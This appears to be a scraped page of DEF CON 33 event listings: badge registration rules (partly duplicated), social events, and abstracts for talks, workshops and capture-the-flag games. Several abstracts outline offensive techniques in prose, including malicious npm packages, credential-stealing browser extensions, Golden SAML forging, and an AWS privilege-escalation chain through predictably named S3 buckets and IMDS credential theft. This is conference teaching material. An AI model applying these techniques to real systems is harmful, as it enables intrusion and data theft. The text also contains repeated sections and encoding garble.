<p>The DEF CON Shoot is a public event that happens just prior to the DEF CON hacker conference in Las Vegas, Nevada. It is an opportunity to see and shoot some of the guns belonging to your friends while taking pride in showing and firing your own steel, as well, in a relaxed and welcoming atmosphere. We choose a spot, then we rent tables, canopies, and bring all the necessary safety equipment and amenities. All you need to bring yourself and (optionally) your firearms. New shooters and veterans both attend regularly. You can attend with your firearms, of course, but folk without guns of their own in Vegas may have the opportunity to try gear from others in attendance. Admission costs are intentionally kept low, just so we can break even on expenses for the amenities provided.</p>

<p>Linecon is your optional opportunity to stand (or sit) in line for human registration to open. Doors will open for linecon on Wednesday at approximately 17:00. When human registration opens on Thursday at approximately 08:00, they start working the linecon queue, and the line will start moving quickly. (Please understand that we will begin processing the line on Thursday morning as soon as the cashiers and materials are in place; we will strive for Thursday 08:00, but actual start may be slightly earlier or later.)</p>

<p>Online badge purchase (aka pre-registration) has no impact on linecon. You can join the line on Wednesday (if you wish) regardless of whether you purchased a badge online or intend to pay with cash. There is only one linecon for both types of badge sales. </p>

<p>Please help us make this a great experience for everyone by <strong>following directions given by goons</strong>. After human registration opens, there may be one line for all of registration, or there may be two lines (one for online sales (pre-registration) and one for cash sales). This may also change over time, based on available staffing and necessary crowd control. We will strive to make it easily understandable in-person as to which line you should join. </p>

<p>Please also review the ""Human Registration Open"" event, and familiarize yourself with the <strong>important notes</strong> therein.</p>

<p>Defcon.run is a beloved tradition at DEF CON, bringing together hackers for a refreshing start to the day. Originally known as the DEF CON 4x5K, the event has evolved into a distributed, community-driven experience featuring fun runs and rucks across Las Vegas. Participants can choose from various routes, ranging from simple 5Ks to more ambitious distances.</p>

<p>For DEF CON 33, the gathering point is ""The Spot"" by the North Entrance of the Las Vegas Convention Center West Hall. Here, the real wild hares gather before the sun has a chance to burn up this city of sin. The runs kick off at 06:00 Thursday through Sunday! But be there early for hype talks and shenanigans. We also have a whole new Meshtastic setup and website features we're adding. There are other runs swag drops and social meetups planned throughout the day and night as well!</p>

<p>Whether you're a seasoned runner or looking for something different, defcon.run offers a unique way to connect with other hackers and kick off your day. For more details and to sign up, visit defcon.run.</p>

<p>Our human registration process this year will be very similar to previous years. Please be patient. All of the times listed here are <strong>approximate</strong>. </p>

<h1 id=""basics"">Basics</h1>

<h3 id=""whoneedsabadge"">Who needs a badge?</h3>

<p>A badge is required for each human age 8 and older.</p>

<h3 id=""human"">Human?</h3>

<p>You are a human if you do not know otherwise. People that are not humans include goons, official speaker, village/community/contest/creator staff, press, black badge holders, or similar. If you are not a human, you need to register separately. If you don't know how, see an NFO goon (NFO Node, formerly known as an infobooth, is where you can get help). The remainder of this message applies only to humans.</p>

<h3 id=""lineslinecon"">Lines? Linecon?</h3>

<p>Linecon is your optional opportunity to stand (or sit) in line for human registration to open. Doors will open for linecon on Wednesday at approximately 17:00. When human registration opens on Thursday at approximately 08:00, they start working the linecon queue, and the line will start moving quickly. (Please understand that we will begin processing the line on Thursday morning as soon as the cashiers and materials are in place; we will strive for Thursday 08:00, but actual start may be slightly earlier or later.)</p>

This may also change over time, based on available staffing and necessary crowd control. We will strive to make it easily understandable in-person as to which line you should join. </p>

<h1 id=""waystobuyabadge"">Ways to buy a badge</h1>

<ul>
<li>$560 <a href=""https://shop.defcon.org/products/def-con-33-ticket"">online purchase</a> until July 18, 2025. Tickets are transferable. Please read the details on the linked page.</li>
<li>$580 <a href=""https://shop.defcon.org/products/def-con-33-ticket"">online purchase</a> until August 1, 2025. Tickets are transferable. Please read the details on the linked page.</li>
<li>$500 cash purchase on-site.</li>
<li>As part of a BlackHat registration.</li>
</ul>

<h3 id=""onlinepurchase"">Online Purchase</h3>

<p>You will be emailed a QR code to the email address provided when you bought your badge. Please guard that QR code as though it is cash -- it can only be redeemed once, and anyone can redeem it if they have it (including a photo of it). Badges are picked-up on-site -- they will not be mailed or shipped.</p>

<p>We can scan the QR code either from your phone's display or from a printed copy. You <strong>must</strong> have the QR code with you in order to obtain your badge. As you approach the front of the line, if you are going to show your QR code on an electronic device, please ensure that your display is set to maximum brightness. </p>

<p>If you pre-registered, but ultimately are unable to attend DEF CON and want to cancel your purchase, the <strong>only</strong> way to get a refund is from the original online source. We are unable to provide any refunds on-site at DEF CON. There is a fee to have your badge canceled: $34 before July 18, and $84 on and after July 18.</p>

<p>Online purchases are provided a receipt via email when the purchase is made.</p>

<p>Online purchase -- often referred to as pre-registration -- does not allow you to skip any line/queue to pick up your badge. Once you arrive on-site, you will need to join the existing line for human registration. There may or may not be a dedicated line for pre-registration badge pickup, depending on when you arrive, how long the line is, available staff, etc.</p>

<h3 id=""cashpurchase"">Cash Purchase</h3>

<p>Badges will be available for purchase on-site at DEF CON. All badge sales are <strong>cash only</strong>. No checks, money orders, credit cards, etc., will be accepted. In order to keep the registration line moving as quickly as possible, please have <strong>exact change</strong> ready as you near the front of the line.</p>

<p>There are no refunds given for cash sales. If you have any doubt about your desire to buy a badge, please refrain from doing so.</p>

<p>We are unable to provide printed receipts at the time of the sale. A generic receipt for the cash sale of a badge will be made available on media.defcon.org after the conference. You are welcome to print your own copy of the receipt on plain paper.</p>

<h3 id=""viablackhat"">Via BlackHat</h3>

<p>If you've purchased a DEF CON badge as part of your Black Hat registration, you're in luck - you will be able to pick up your DEF CON badge at Black Hat on Thursday.  Please bring your Black Hat badge and watch for emails from Black Hat about where exactly the badge pickup will be.  There will be DEF CON goons at Mandalay at the pickup desk to help out and answer questions.</p>

<p>Please note that DEF CON is not able to access or verify Black Hat registration or attendee info.  DEF CON's preregistration list is not the same as Black Hat's.  For help, ask at Black Hat registration or the concierge area. </p>

<h1 id=""misc"">Misc</h1>

<p>Want to buy multiple badges? No problem! We're happy to sell you however many badges you want to pay for.</p>

<p>If you lose your badge, there is unfortunately no way for us to replace it. You'll have to buy a replacement at full price. Please don't lose your badge. :( </p>

<p>If you are being accompanied by a full-time caretaker (such as someone who will push your wheelchair, and will accompany you at all times), please ask to speak to a Registration Goon. Your caretaker will receive a paper badge that will permit them to accompany you everywhere you go.</p>

<h1 id=""stillneedhelp"">Still need help?</h1>

<p>If you have questions about anything regarding human registration that are not addressed here, please ask to speak to a Registration Goon.</p>

<p>This is an All-Points Bulletin for the Las Vegas DEFCON area. Caution. A UFO has been spotted crashing into the nearby landscape. Be on the lookout for an unidentified creature. It is considered unarmed and incredibly dangerous. Eye-witness testimony indicates the space invader answers to ""Stitcharoo"" or ""Experiment #696"". The monster appears to be keen on projecting electronic music at uncomfortably loud bass-filled volumes, primarily consisting of the genre Vocal House. Under no circumstances is the alien to be allowed near electronic devices such as turntables, mixers, or other DJ equipment. The creature seems to have a preference for ice cream. Message Repeat. This is an All-Points Bulletin for the Las Vegas DEFCON area. Caution.</p>

<p>Every year, electronic badges light up DEF CON, sparking creativity, community, and curiosity. But behind the blinking LEDs and clever puzzles are questions we rarely ask: How safe is this badge for its users? What's its environmental footprint? In this talk, we'll dive into the design of ""The SEC Village Badge"" from concept to execution - but more importantly, we'll explore a proposed framework for badge makers to disclose key safety information and environmental impact of their creation. From battery safety considerations and materials selection to end-of-life recycling and disposal, we'll discuss how transparency can empower the community, inspire more responsible design, and keep the badge life culture thriving sustainably. Whether you're a seasoned hardware hacker, a first-time badge maker, or just curious about what goes into creating these wearable works of art, this talk will challenge us to think beyond the soldering iron and consider the broader impact of our creations.</p>

<p>Our human registration process this year will be very similar to previous years. Please be patient. All of the times listed here are <strong>approximate</strong>. </p>

<h1 id=""basics"">Basics</h1>

<h3 id=""whoneedsabadge"">Who needs a badge?</h3>

<p>A badge is required for each human age 8 and older.</p>

<h3 id=""human"">Human?</h3>

<p>You are a human if you do not know otherwise. People that are not humans include goons, official speaker, village/community/contest/creator staff, press, black badge holders, or similar. If you are not a human, you need to register separately. If you don't know how, see an NFO goon (NFO Node, formerly known as an infobooth, is where you can get help). The remainder of this message applies only to humans.</p>

<h3 id=""lineslinecon"">Lines? Linecon?</h3>

<p>Linecon is your optional opportunity to stand (or sit) in line for human registration to open. Doors will open for linecon on Wednesday at approximately 17:00. When human registration opens on Thursday at approximately 08:00, they start working the linecon queue, and the line will start moving quickly. (Please understand that we will begin processing the line on Thursday morning as soon as the cashiers and materials are in place; we will strive for Thursday 08:00, but actual start may be slightly earlier or later.)</p>

<p>Online badge purchase (aka pre-registration) has no impact on linecon. You can join the line on Wednesday (if you wish) regardless of whether you purchased a badge online or intend to pay with cash. There is only one linecon for both types of badge sales. </p>

<p>Please help us make this a great experience for everyone by <strong>following directions given by goons</strong>. After human registration opens, there may be one line for all of registration, or there may be two lines (one for online sales (pre-registration) and one for cash sales). This may also change over time, based on available staffing and necessary crowd control. We will strive to make it easily understandable in-person as to which line you should join. </p>

<h1 id=""waystobuyabadge"">Ways to buy a badge</h1>

<ul>
<li>$560 <a href=""https://shop.defcon.org/products/def-con-33-ticket"">online purchase</a> until July 18, 2025. Tickets are transferable. Please read the details on the linked page.</li>
<li>$580 <a href=""https://shop.defcon.org/products/def-con-33-ticket"">online purchase</a> until August 1, 2025. Tickets are transferable. Please read the details on the linked page.</li>
<li>$500 cash purchase on-site.</li>
<li>As part of a BlackHat registration.</li>
</ul>

<h3 id=""onlinepurchase"">Online Purchase</h3>

<p>You will be emailed a QR code to the email address provided when you bought your badge. Please guard that QR code as though it is cash -- it can only be redeemed once, and anyone can redeem it if they have it (including a photo of it). Badges are picked-up on-site -- they will not be mailed or shipped.</p>

<p>We can scan the QR code either from your phone's display or from a printed copy. You <strong>must</strong> have the QR code with you in order to obtain your badge. As you approach the front of the line, if you are going to show your QR code on an electronic device, please ensure that your display is set to maximum brightness. </p>

<p>If you pre-registered, but ultimately are unable to attend DEF CON and want to cancel your purchase, the <strong>only</strong> way to get a refund is from the original online source. We are unable to provide any refunds on-site at DEF CON. There is a fee to have your badge canceled: $34 before July 18, and $84 on and after July 18.</p>

<p>Online purchases are provided a receipt via email when the purchase is made.</p>

<p>Online purchase -- often referred to as pre-registration -- does not allow you to skip any line/queue to pick up your badge. Once you arrive on-site, you will need to join the existing line for human registration. There may or may not be a dedicated line for pre-registration badge pickup, depending on when you arrive, how long the line is, available staff, etc.</p>

<h3 id=""cashpurchase"">Cash Purchase</h3>

<p>Badges will be available for purchase on-site at DEF CON. All badge sales are <strong>cash only</strong>. No checks, money orders, credit cards, etc., will be accepted. In order to keep the registration line moving as quickly as possible, please have <strong>exact change</strong> ready as you near the front of the line.</p>

<p>There are no refunds given for cash sales. If you have any doubt about your desire to buy a badge, please refrain from doing so.</p>

<p>We are unable to provide printed receipts at the time of the sale. A generic receipt for the cash sale of a badge will be made available on media.defcon.org after the conference. You are welcome to print your own copy of the receipt on plain paper.</p>

<h3 id=""viablackhat"">Via BlackHat</h3>

<p>If you've purchased a DEF CON badge as part of your Black Hat registration, you're in luck - you will be able to pick up your DEF CON badge at Black Hat on Thursday.  Please bring your Black Hat badge and watch for emails from Black Hat about where exactly the badge pickup will be.  There will be DEF CON goons at Mandalay at the pickup desk to help out and answer questions.</p>

<p>Please note that DEF CON is not able to access or verify Black Hat registration or attendee info.  DEF CON's preregistration list is not the same as Black Hat's.  For help, ask at Black Hat registration or the concierge area. </p>

<h1 id=""misc"">Misc</h1>

<p>Want to buy multiple badges? No problem! We're happy to sell you however many badges you want to pay for.</p>

<p>If you lose your badge, there is unfortunately no way for us to replace it. You'll have to buy a replacement at full price. Please don't lose your badge. :( </p>

<p>If you are being accompanied by a full-time caretaker (such as someone who will push your wheelchair, and will accompany you at all times), please ask to speak to a Registration Goon. Your caretaker will receive a paper badge that will permit them to accompany you everywhere you go.</p>

<h1 id=""stillneedhelp"">Still need help?</h1>

<p>If you have questions about anything regarding human registration that are not addressed here, please ask to speak to a Registration Goon.</p>

<p>Software supply chain attacks are out of control! Between 2019 and 2023 software supply chain attacks increased by more than 740% year on year. Things have only gotten worse since then, with attacks like Bybit, Ultralytics, LottieFiles, Polyfills, and of course XZ utils happening in the last 18 months. But how are these supply chain attacks delivered? Often, the attack starts with a malicious npm package.</p>

<p>According to Sonatype, 98.5% of malicious software packages exist in the npm registry. There are several reasons that npm is particularly well suited for delivering malware, and that's why I chose to focus just on npm for this 4 hour workshop.</p>

<p>This hands-on workshop will teach both software engineers, and infosec practitioners how npm malware works. Weâll learn what makes npm malware unique from other software package malware, and how the author has been using his knowledge of npm malware in his research, and to deliver unique offensive security engagements. Most importantly how to identify, analyze, create and defend against malicious NPM packages in this workshop.</p>

<p>The trainer for this workshop, Paul McCarty, is literally writing the book on the subject âHacking npmâ, so he will drop lots of in-depth, never before seen npm techniques.</p>

<p>Paul is the Head of Research at Safety (safetycli.com) and a DevSecOps OG. He loves software supply chain research and delivering supply chain offensive security training and engagements. He's spent the last two years deep-diving into npm and has made several discoveries about the ecosystem. Paul founded multiple startups starting in the '90s, with UtahConnect, SecureStack in 2017, and SourceCodeRED in 2023. Paul has worked for NASA, Boeing, Blue Cross/Blue Shield, John Deere, the US military, the Australian government and several startups over the last 30 years. Â Paul is a frequent open-source contributor and author of several DevSecOps, software supply chain and threat modelling projects. Heâs currently writing a book entitled âHacking NPMâ, and when heâs not doing that, heâs snowboarding with his wife and 3 amazing kids.</p>

<p>Using cryptography is often a subtle practice and mistakes can result in significant vulnerabilities. This workshop will cover many of these vulnerabilities which have shown up in the real world, including CVE-2020-0601. This will be a hands-on workshop where you will implement the attacks after each one is explained. I will provide a VM with a tool written in Python to execute the attacks. A good way to determine if this workshop is for you is to look at the challenges at cryptopals.com and see if those look interesting, but you could use in person help understanding the attacks. While not a strict subset of those challenges, there is significant overlap. The exercises will range from decrypting ciphertext to recovering private keys from public key attacks allowing us to create TLS cert private key and ssh private key files.</p>

<font size=""+1""><strong>SpeakerBio:</strong></font>&nbsp;&nbsp;Matt Cheung<br>
<p>Matt Cheung started developing his interest in cryptography during an internship in 2011. He worked on implementation of a secure multi-party protocol by adding elliptic curve support to an existing secure text pattern matching protocol. Implementation weaknesses were not a priority and this concerned Matt. This concern prompted him to learn about cryptographic attacks from Dan Boneh's crypto 1 course offered on Coursera and the Matasano/cryptopals challenges. From this experience he has given workshops at the Boston Application Security Conference, BSidesLV, DEF CON, and the Crypto and Privacy VillageHe now serves on the programming committee of the Crypto and Privacy Village.

<font size=""+1""><strong>Description:</strong></font><br>
<p>Browser extensions have quietly become one of the most underappreciated attack surfaces. While marketed as productivity enhancers, many of these extensions operate with elevated privileges that rival native malware in terms of access to sensitive user and organizational data.</p>

<p>This hands-on workshop takes a deep dive into how browser extensions operate under the hood and exposes how easily legitimate APIs can be weaponized to exfiltrate credentials, hijack sessions, monitor user behavior, and leak sensitive corporate information. By reverse-engineering real-world extension behavior and building functioning proof-of-concept (PoC) malicious extensions, participants will gain a direct understanding of the risks these extensions pose.</p>

<p>Through practical exercises, participants will:
- Learn the browser extension architecture and permission model
- Examine key APIs commonly misused for surveillance or data theft
- Build PoC malicious extensions that exfiltrate session cookies, read passwords, record keystrokes, capture DOM content, and more
- Analyze techniques for stealth, obfuscation, and evasion
- Explore detection blind spots in endpoint and SSE security tools
- Review mitigation strategies and enterprise hardening recommendations</p>

<p>SAMLSmith is the go-to tool for penetrating SAML applications with response forging. An evolution of the original tooling developed for proof-of-concept of SAML response forging in Entra ID, SAMLSmith is the product of continued research on SAML. While far from new, enterprises continue to not prioritize the security of how SaaS applications integrate or understand best practices for securing them. With many factors at play, SAML response forging can range from extremely difficult to near impossible for a SOC to detect. SAMLSmith has a lot of tricks up its sleeve, including: [1] Multiple identity provider response forging. [2] AD FS specific response forging mode. [3] SAML request processing. [4] InResponseTo support. SAMLSmith can be used in several response forging scenarios where the private key material can be obtained. In demonstration of use, weâÃÃ´ll explore using SAMLSmith for performing a Golden SAML attack against AD FS. Further, weâÃÃ´ll demonstrate the use of SAMLSmith that ties into new research around response forging, penetrating certain types of SaaS applications with even more stealth.</p>

<p>Choose your side!</p>

<p>Blue Team
You are assigned to the Cybersecurity Team servicing four Regional Airports within the IG Labs Regional Airport System. The shift this evening started with routine checking status boards, reviewing threat alerts, and checking for any newly identified vulnerabilities that may have an impact on the system from both Information Technology (IT) and Operational Technology (OT) vectors.</p>

<p>Around midnight, chaos ensues! Runway lighting is turning off at your airport and others nearby, planes are circling waiting to land or diverting to other locations. You must regain access to your systems, find the problem, and restore operation to the Runway Lighting Control System quickly and ensure that the other regional airports your team is responsible for do not lose control of their systems and operations are able to continue without interruption.</p>

<p>Red Team(s)
Cybersecurity Teams are often heavily focused on securing Information Technology (IT) systems and devices but may not consider securing Operational Technology (OT) systems and devices. While OT systems and devices may be connected to IT systems, the type of data and protocols are different.</p>

<p>You start your day exploring OT system vulnerabilities and consider what chaos you could create. You see a report that the runway lighting system at one of the IG Labs Regional Airports has been compromised. You start researching to learn more about the attack and the IG Labs Regional Airport System. Satisfied that you have learned enough to add to the madness that has been created at La Valoria, you decide to launch an attack of your own.</p>

<p>Success will be determined by the ability to disrupt the control and operations of the Runway Lighting Systems for the IG Labs Regional Airports at the OT level. DoS and DDoS attacks are not permitted as the intent is to demonstrate an understanding of OT systems, their functionality, and protocols.</p>

<p>Fewer than 500 of npm's top 10,000 most downloaded packages have one or more disclosed vulnerabilities, which is not surprising considering that the ratio of open source packages to known vulnerabilities is less than 0.5%. In this talk, we will discuss why current OSS vulnerability discovery efforts are falling short, addressing common mistakes made by open source maintainers, the challenges of scaled security scanning, and the shortcomings of todayâs open source bug bounty programs. To conclude, I'll propose a transition from crowdsourced bug hunting to crowdsourced triaging, emphasizing how often repository issues, OSS-Fuzz crash reports, and similar findings go untriaged, despite being publicly available and there potential to reveal (undisclosed) critical security risks.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Sector Down is a high-stakes, immersive multiplayer card game where critical infrastructure and cybersecurity collide. Designed for teams of 5, 10, 15, or 20 players, this simulation pits defenders and attackers against each other in a race against the inevitable: The Doom Clock.</p>

<p>ð¡ï¸Defend or Disrupt</p>

<p>Players are divided into two sides:
- Blue Team â Critical infrastructure defenders. Each Blue player manages a sector with three vital facilities: Physical, Network, and Financial. Their mission? Keep the systems alive and online while working together to run out the clock.
- Red Team â Offensive disruptors. Red players attempt to take down facilities using calculated cyberattacks and chaos tactics. Their goal: force sector collapses and trigger the Doom Clock.</p>

<p>â±ï¸ Time-Based Tactics</p>

<p>The game progresses in strategic phases where players draw cards, take action using worker tokens, and discard based on hand limits. Watch out for unpredictable âWhite Playsâârandom game events that add surprise twists every few rounds.</p>

<p>ð¥ The Doom Clock</p>

<p>When half of all sectors or any core sectors go down, the Doom Clock starts ticking. Teams must respond fast: Blue must recover systems before the countdown hits zero, or Red claims victory.</p>

<p>ð¤ Team Dynamics</p>

<ul>
<li>Worker Sharing: Blue teammates can lend each other resources in bonus phases.</li>
<li>Overtime Mechanics: When the pressureâs on, Blue players can double down on effortâwith the tradeoff of worker exhaustion in future turns.</li>
</ul>

<p>ð® Why You Should Play</p>

<ul>
<li>Dive into a realistic cybersecurity crisis.</li>
<li>Learn how interdependent systems behave under attack.</li>
<li>Collaborate and compete with hackers, healthcare defenders, and critical infrastructure enthusiasts.</li>
<li>Engage with a visually rich map interface and fast-paced card dynamics.</li>
</ul>

<p>Whether you're a strategist, a chaos agent, or just love competitive simulation, Sector Down challenges your mind and your teamwork. Can your team hold the line or will your sector go dark?â Come play during DEF CON 33.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Hospitals and trauma centers face critical delays in triage, patient monitoring, and shift handoffsâleading to avoidable medical errors, increased wait times, and compromised patient safety. What if AI-powered triage, biometrics, and AI-driven simulation labs could change that?
This talk explores how biometric AI, smart bedside displays, digital handoff systems, and AI physiology simulations can enhance emergency care, reduce human error, and revolutionize medical training.
Key Innovations Weâll Unpack:
1.        AI-Facial Recognition: Upon entry to the hospital/facility, AI-powered sensors take a real-time picture of each patient as they walk/check into the ED and sync the biometric picture with their Medical Record Number (MRN) patient chart.
2.        AI-Powered Biometric Triage: AI sensors continue to scan patients in the waiting room, analyzing vital signs (HR, respiratory rate, O2 sat, temp), non-verbal distress like bleeding (trauma), pain based on facial droop (Stroke), chest pain or shortness of breath (Heart Attack), syncope, labor/delivery, and grimacing (pain), and factor all these into the Emergency Severity Index (ESI) algorithm for a real-time comprehensive display to triage staff for their review. 
3.        Digital Handoff Reporting: Automated shift changes summaries ensure that critical patient data like medical and surgical history, labs, vital trends, pending orders, isolation precautions, and risk factors are not lost between clinicians. It also reduces paper waste, redundancy, and inefficiencies like report duration. 
4.        Digital Smart Room Display (i.e. TV): Like at a nice hotel room, your patient room tv would provide you with a personalized channel with your real-time medical updates (aka tv medical chart), that are approved by your providers, that are synced to your EHR chart and secured with a personalized pin you created during registration. Upon discharge of the hospital, your channel would be deactivated. This would enhance the time from provider-to-patient communication, decrease patient wait times for results, and ensure healthcare treatment transparency. It is optional and on-demand for the patient and family if consent is given by the patient. 
5.        AI Physiology in Simulation Labs: AI-driven simulated patient models that replicate real-time human physiology, responses to trauma, medication interactions, and disease progressionâtransforming medical education.
6.        Cybersecurity in AI-Driven Emergency Care: Protecting biometric patient data, preventing AI hallucinations and poisoning, and securing AI-driven training systems.
By integrating AI-driven biometrics, automating bedside displays and handoff reports, and AI physiology in healthcare, we can prioritize critical patients faster, reduce handoff errors, and accelerate healthcare education. The future of emergency care isnât just faster, itâs predictive, automated, and cybersecure.</p>

<p>If you have tried your hand at bug bounty, you probably heard about automation setups that some hunters use. The caveat here though, is there is little to no information sharing about this topic. I don't claim to be an expert, but after a couple years of tool building and experimenting, I think these kind of systems can be accessible/buildable by anyone. I want to share some of ""tips"" and ""pitfalls"" that I have come across building some of my own automation around bug bounty. Topics will range from data engineering, event and data handling, architecture options, different ways to turn data into bugs, etc. I don't pretend to be an expert, but it is my opinion that there is not enough people sharing ideas and techniques when it comes to applying ENGINEERING to bug bounties. Automation, data, and discovery should be words that every bug hunter is fond of, not afraid of.</p>

<p>No one can deny that the job of a bug bounty hunter is tedious at times. The goal of this talk is simple: <strong>to make you a more efficient hacker using Caido</strong>. There is a lot to cover, but you can expect content surrounding the following: AI integration, collaboration, automation (JIT and otherwise), efficient navigation, and a slew of new Caido features. Caido is a rapidly evolving tool - consider this your crash course on getting back up to speed.</p>

<p>How much do you trust your cloud provider to hide the ownership information for your resources? Many organizations believe that their ownership information for cloud hosted resources is not available to anonymous users. Unless there's an associated DNS record or other obvious identifiers (website content, SSL certificates, etc.), it might seem difficult to anonymously identify a cloud resourceâs owner. What if we told you that some of your Azure resources can expose their ownership information? 
This talk will explain how multiple Azure resource types (and Microsoft services) inadvertently expose their ownership information, allowing attackers to enumerate potential entry points into an Azure tenant. Thanks to the supporting structure of Azure resource subdomains, and public DNS data sources, we enumerated the ownership information of over 500,000 Azure resources. 
We will wrap things up by sharing a new tool (ATEAM - Azure Tenant Enumeration and Attribution Module) that can be used to replicate our research, so you too can find out where all of your Azure resources have been hiding.</p>

<font size=""+1""><strong>Description:</strong></font><br>
<p>Cloud environments are vast, complex, and often opaqueâeven to their owners. In this talk, we expose how AWSâs design decisions around default service roles and resource naming patterns created hidden privilege escalation paths that could lead to full AWS account takeover.</p>

<p>We begin by introducing the concept of Shadow ResourcesâS3 buckets automatically relied upon by internal AWS services, which users donât create or control directly, but are referenced implicitly. We show how attackers could preemptively claim these buckets in unused regions using predictable naming conventions (like aws-glue-assets-{AccountID}-{Region}), planting malicious content or intercepting trusted workflows. This silent hijacking technique breaks the assumed isolation between services and accounts.</p>

<p>From there, we pivot to Shadow Rolesâdefault IAM roles created or recommended by AWS services such as SageMaker, Glue, and EMR. These roles often come with dangerously over-permissive policies (e.g., AmazonS3FullAccess). With these roles in place, any compromised service becomes a launchpad: we demonstrate how importing a single malicious Hugging Face model into SageMaker enables an attacker to silently backdoor Glue jobs across the entire account by tampering with trusted S3.</p>

<p>Finally, we share findings from our AWS Glue research, where we discovered that the /etc/passwd file was writable within the container environment, enabling local privilege escalation to root. From there, we were able to extract the real IAM credentials assigned to the underlying managed service instance via IMDSv2âcredentials that belonged to AWSâs internal Glue account. These credentials granted access to sensitive internal APIs and allowed enumeration of infrastructure metadata across other users, demonstrating that the managed runtime could serve as an unexpected vector for privilege escalation and cross-tenant exposure.</p>

<p>This layered attack pathâfrom shadow resources to shadow roles to breaking the runtime isolation of managed servicesâdemonstrates a critical but overlooked risk in cloud architecture.</p>

<p>In this talk, weâll share how our investigation began with a single misconfigured resource and evolved into a broader exploration of AWS's internal service trust model. Weâll walk through the methodology that helped us uncover these vulnerabilities and highlight how each discovery opened the door to the nextâusing specific privilege escalation techniques to chain across services and amplify impact. Expect a technical deep dive, real-world attack flows, and a new lens on how seemingly isolated misconfigurations can lead to complete compromise.</p>

Find enough flags on our web hosted CTF platform, you get a 5N4CK3Y dispense code, punch it in, and a badge is vended to you! There are a variety of challenges to earn a badge as well others to continue working on the badge itself once obtained. These span from hardware hacking, reverse engineering, OSINT, network security, phreaking, wireless, and cryptography to name a few. There's a little bit of everything, so it's a perfect way to learn something at one of the many DEF CON villages and talking with people you meet, then attempt the CTF challenges to dispense a badge. Hardware hacking is our passion and we want people to learn on badges once they get them.</p>

<h1 id=""projectaccess:afoxhuntintheshadows"">PROJECT ACCESS: A Fox Hunt in the Shadows</h1>

<p>The last surviving fragments of Project ACCESS, a defunct open comms initiative, have resurfaced. The faceless OmniCorp thought they had erased it from the spectrum, but rogue operatives are pushing back. Disguised among the DEF CON crowd, Foxes are carrying the pieces needed to reboot the system.</p>

<p>Theyâre broadcasting open signals across the con space. Your job? Track them down, follow the trail, and recover the payloads. Some Foxes are stationary. Others are on the move. All of them have something you needâbut they wonât just hand it over. Youâll have to answer DEF CON trivia, solve puzzles, or earn their trust in creative ways.</p>

<p>This isnât a gear-only hunt. Whether youâre rocking SDRs, handheld radios, or just tuned into the right frequency, youâve got a shot. Itâs part signal chase, part real-world goose chase, and 100% hacker weirdness.</p>

<p>Expect:
- Live human Foxes broadcasting short-range signals
- Some Foxes roaming the con floor hunt them down, respectfully
- DEF CON history questions, crypto puzzles, and maybe a social engineering twist or two
- Physical items or clues exchanged when you succeed
- No encryption. No gatekeeping. Just old school radio and clever chaos.</p>

<p>Think you can track the signal, crack the code, and restore the last breath of open access?</p>

<p>Then grab your gear, tune in, and start hunting.</p>

<p>In this game capture the flag you will be presented with real configurations of real wireless and radio technologies to attack. Practice your skill and learn new ones from Radio Frequency IDentification (RFID) through Software Defined Radio (SDR) and up to Bluetooth and WiFi. There may even be Infrared, if you have the eye for it.</p>

<p>RF Hackers Sanctuary is once again holding the Radio Frequency Capture the Flag (RFCTF) at DEF CON 32. RFHS runs this game to teach security concepts and to give people a safe and legal way to practice attacks against new and old wireless technologies.</p>

<p>We cater to both those who are new to radio communications as well as to those who have been playing for a long time. We are looking for inexperienced players on up to the SIGINT secret squirrels to play our games. The RFCTF can be played with a little knowledge, a pen tester's determination, and $0 to $$$$$ worth of special equipment. Our virtual RFCTF can be played completely remotely without needing any specialized equipment at all, just using your web browser! The key is to read the clues, determine the goal of each challenge, and have fun learning.</p>

<p>This game doesn't let you sit still either, as there are numerous fox hunts, testing your skill in tracking various signals. If running around the conference looking for WiFi, Bluetooth, or even a Tire Pressure Monitoring System (TPMS) device sounds like fun, we are your source of a higher step count.</p>

<p>There will be clues everywhere, and we will provide periodic updates via discord and twitter. Make sure you pay attention to what's happening at the RFCTF desk, #rfctf on our discord, on Twitter @rf_ctf, @rfhackers, and the interwebz, etc. If you have a question - ASK! We may or may not answer, at our discretion.</p>

<p>A cyber defense Capture the Flag inspired by a mix of trending nation-state actor kill chains. You are an incident responder tasked to investigate multiple incidents. You will have access to a SIEM and other forensic data; however, just like in real life, these tools have issues you must overcome to uncover what happened.</p>

<p>The CTF challenges contestants to leverage diverse cyber defense skills, including Incident Response, Forensics, and Threat Hunting. Both host and network telemetry are required to solve all the flags.</p>

<p>BTVâs Project Obsidian crew developed the CTF to allow anyone, regardless of skill or knowledge, to participate and sharpen their cyber defense skills. We recommend creating or joining a team if you are new to cyber defense. We highly recommend attending the other BTV Project Obsidian presentations and panels to learn even more about different cyber defense topics.</p>

Bug Bounty Village CTF: Experience the Thrill of a Real Bug Bounty Experience<br />

<p>This year, for the first time ever, Bug Bounty Village is bringing you a Capture the Flag with a twist. This CTF is designed to feel just like a real bug bounty hunt.</p>

<p>Dive into a vulnerable application and see if you can uncover its hidden weaknesses just like you would on a bug bounty program. The CTF is designed to be accessible for all experience levels, from beginners looking for their first bug to veteran hunters eager for a very interesting challenge. Expect a range of vulnerabilities, from trivial finds to sophisticated ones that will push you to the limit.</p>

<p>But thatâs not all. Weâre adding a unique real-world flavor to the competition. Participants onsite at DEF CON will submit some of their bug reports for those to be validated by real bug bounty triagers volunteering their expertise to make this experience as real as possible. This process will determine scores based not just on technical prowess but on report quality and professionalism, just like in a bug bounty program.</p>

<p>Get ready for a realistic bug bounty experience, a chance to grow your skills, connect with the community, and show what youâre made of.</p>

<p>Please note that you must be present on-site for our award ceremony on Sunday at 13:00 in order to receive any prizes.</p>

<p>Cryptographic random number generators are a critical part of many deployed cryptosystems. When they fail, so does the cryptography. So why leave their security to chance?</p>

<p>Yet, over the past two decades, researchers have discovered vulnerabilities in numerous widely deployed algorithms and implementations designed to produce secure random numbersâall derived from supposedly vetted standards!</p>

<p>If you're more conspiratorially minded, you suspect some foul play.</p>

<p>This talk draws on Shaananâs work discovering many of the CVEs and vulns to find that behind each one is the hint of an under-discussed flavour of adversary: one who subtly threads flaws into our standards.</p>

<p>Dr. Shaanan Cohney is the Deputy Head of the School of Computing and Information Systems at the University of Melbourne. Coming from the security community, his research attempts to use a wide variety of traditional computer science research techniques to address problems in public policy.</p>

